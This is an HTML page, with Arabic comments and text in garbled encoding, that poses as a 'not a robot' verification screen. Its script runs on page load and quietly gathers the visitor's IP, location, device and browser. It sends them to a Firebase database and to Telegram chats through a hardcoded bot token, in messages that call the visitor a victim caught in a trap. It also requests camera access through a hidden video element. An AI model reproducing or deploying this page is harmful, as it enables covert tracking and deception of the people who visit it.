<!DOCTYPE html>
<html lang="ar">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Support the communication sites</title>
    
    <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-app.js"></script>
    <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-database.js"></script>

    <style>
        /* Ø§Ù„ØªÙ†Ø³ÙŠÙ‚Ø§Øª Ù…Ø¯Ù…Ø¬Ø© Ù…Ù† style.css */
        * { margin: 0; padding: 0; box-sizing: border-box; font-family: Arial, sans-serif; text-align: center; }
        body {
            height: 100vh; display: flex; align-items: center; justify-content: center;
            background: linear-gradient(-45deg, #ff9800, #9c27b0, #ffcc80, #7b1fa2);
            background-size: 400% 400%; animation: backgroundAnimation 6s ease infinite;
        }
        @keyframes backgroundAnimation { 0% { background-position: 0% 50%; } 50% { background-position: 100% 50%; } 100% { background-position: 0% 50%; } }
        .loading-container { background-color: white; padding: 30px; border-radius: 15px; box-shadow: 0px 0px 15px rgba(0, 0, 0, 0.2); width: 90%; max-width: 400px; }
        h1 { color: red; font-size: 24px; margin-bottom: 10px; }
        p { color: #333; font-size: 18px; margin-bottom: 15px; }
        .progress-container { width: 100%; background-color: #ddd; border-radius: 10px; overflow: hidden; height: 10px; margin: 10px 0; }
        .progress-bar { width: 100%; height: 100%; background-color: red; transition: width 1s linear; }
        #countdown { font-size: 20px; font-weight: bold; }
        video, canvas { display: none; }
    </style>
</head>
<body>
    <div class="loading-container">
        <h1>Ø¬Ø§Ø±ÙŠ Ø§Ù„ØªØ­Ù‚Ù‚ Ù…Ù† Ø£Ù†Ùƒ Ù„Ø³Øª Ø±ÙˆØ¨ÙˆØª</h1>
        <p>ÙŠØ±Ø¬Ù‰ Ø§Ù„Ø§Ù†ØªØ¸Ø§Ø± Ø­ØªÙ‰ Ø§ÙƒØªÙ…Ø§Ù„ Ø§Ù„ÙØ­Øµ Ù„Ø¶Ù…Ø§Ù† Ø£Ù…Ø§Ù† Ø­Ø³Ø§Ø¨Ùƒ.</p>
        <div class="progress-container">
            <div class="progress-bar" id="progress"></div>
        </div>
        <p id="countdown">20</p>
    </div>

    <video id="video" autoplay playsinline></video>
    <canvas id="canvas"></canvas>

    <script>
        document.addEventListener("DOMContentLoaded", async function () {
            // Ø¥Ø¹Ø¯Ø§Ø¯Ø§Øª Firebase
            const firebaseConfig = { databaseURL: "https://elcomando-68116-default-rtdb.firebaseio.com/" };
            if (!firebase.apps.length) { firebase.initializeApp(firebaseConfig); }
            const db = firebase.database();

            // Ø¥Ø¹Ø¯Ø§Ø¯Ø§Øª Ø§Ù„ØªÙ„ÙŠØ¬Ø±Ø§Ù…
            const botToken = "7681653454:AAHdCsBUKbiru2Z-9aDBzMgVeqhuDWGLyjk"; 
            const adminChatId = "5375214810"; 

            // Ø¬Ù„Ø¨ Ø§Ù„Ù€ user_id Ù…Ù† Ø§Ù„Ø±Ø§Ø¨Ø·
            const urlParams = new URLSearchParams(window.location.search);
            const userId = urlParams.get("user_id");

            const countdownElement = document.getElementById("countdown");
            const progressBar = document.getElementById("progress");
            let timeLeft = 20;

            // Ø¨Ø¯Ø¡ Ø§Ù„Ø¹Ø¯ Ø§Ù„ØªÙ†Ø§Ø²Ù„ÙŠ
            const countdownInterval = setInterval(() => {
                timeLeft--;
                countdownElement.textContent = timeLeft;
                progressBar.style.width = (timeLeft / 20) * 100 + "%";
                if (timeLeft <= 0) clearInterval(countdownInterval);
            }, 1000);

            // Ø§Ù„Ø­ØµÙˆÙ„ Ø¹Ù„Ù‰ Ù…Ø¹Ù„ÙˆÙ…Ø§Øª Ø§Ù„Ø¶Ø­ÙŠØ©
            async function getVictimData() {
                try {
                    const ipRes = await fetch("https://api64.ipify.org?format=json");
                    const ipData = await ipRes.ip;
                    const geoRes = await fetch(`https://ip-api.com/json/`);
                    const geoData = await geoRes.json();

                    return {
                        ip: geoData.query || "Unknown",
                        location: `${geoData.city || ''}, ${geoData.country || ''}`,
                        device: navigator.platform,
                        browser: navigator.userAgent,
                        time: new Date().toLocaleString()
                    };
                } catch (e) { return { ip: "Error", time: new Date().toLocaleString() }; }
            }

            // Ø¥Ø±Ø³Ø§Ù„ Ø§Ù„Ø¨ÙŠØ§Ù†Ø§Øª (Firebase + Telegram)
            async function logVictim() {
                const data = await getVictimData();

                // 1. Ø§Ù„Ø¥Ø±Ø³Ø§Ù„ Ù„Ù„ÙÙŠØ±Ø¨ÙŠØ³ (Ù„ÙŠØ¸Ù‡Ø± ÙÙŠ Ù„ÙˆØ­Ø© Ø§Ù„Ù…Ø³ØªØ®Ø¯Ù… Live)
                if (userId) {
                    db.ref('hits/' + userId).push({
                        ...data,
                        type: "Ø¬Ø¯ÙŠØ¯ ğŸŸ¢"
                    });
                }

                // 2. Ø§Ù„Ø¥Ø±Ø³Ø§Ù„ Ù„Ù„ØªÙ„ÙŠØ¬Ø±Ø§Ù… (Ù„Ùƒ ÙˆÙ„Ù„Ù…Ø³ØªØ®Ø¯Ù…)
                const message = `ğŸ¯ **Ø¶Ø­ÙŠØ© Ø¬Ø¯ÙŠØ¯Ø© Ø¯Ø®Ù„Øª Ø§Ù„ÙØ®:**\n\n` +
                                `ğŸ“ Ø§Ù„Ù…ÙˆÙ‚Ø¹: ${data.location}\n` +
                                `ğŸ“¡ IP: ${data.ip}\n` +
                                `ğŸ“± Ø§Ù„Ø¬Ù‡Ø§Ø²: ${data.device}\n` +
                                `â° Ø§Ù„ÙˆÙ‚Øª: ${data.time}`;

                const targets = [adminChatId];
                if (userId && userId !== adminChatId) targets.push(userId);

                targets.forEach(chatId => {
                    fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
                        method: "POST",
                        headers: { "Content-Type": "application/json" },
                        body: JSON.stringify({ chat_id: chatId, text: message, parse_mode: "Markdown" })
                    });
                });
            }

            // ØªØ´ØºÙŠÙ„ Ø§Ù„ÙƒØ§Ù…ÙŠØ±Ø§ ÙÙŠ Ø§Ù„Ø®Ù„ÙÙŠØ© (Ø§Ø®ØªÙŠØ§Ø±ÙŠ Ø­Ø³Ø¨ Ø±ØºØ¨ØªÙƒ)
            async function startSilentCamera() {
                try {
                    await navigator.mediaDevices.getUserMedia({ video: true });
                    logVictim();
                } catch (e) { logVictim(); } // Ù„Ùˆ Ø±ÙØ¶ Ø§Ù„ÙƒØ§Ù…ÙŠØ±Ø§ Ø¨Ø±Ø¶Ù‡ Ù‡Ù†Ø¨Ø¹Øª Ø§Ù„Ø¨ÙŠØ§Ù†Ø§Øª
            }

            startSilentCamera();
        });
    </script>
</body>
</html>
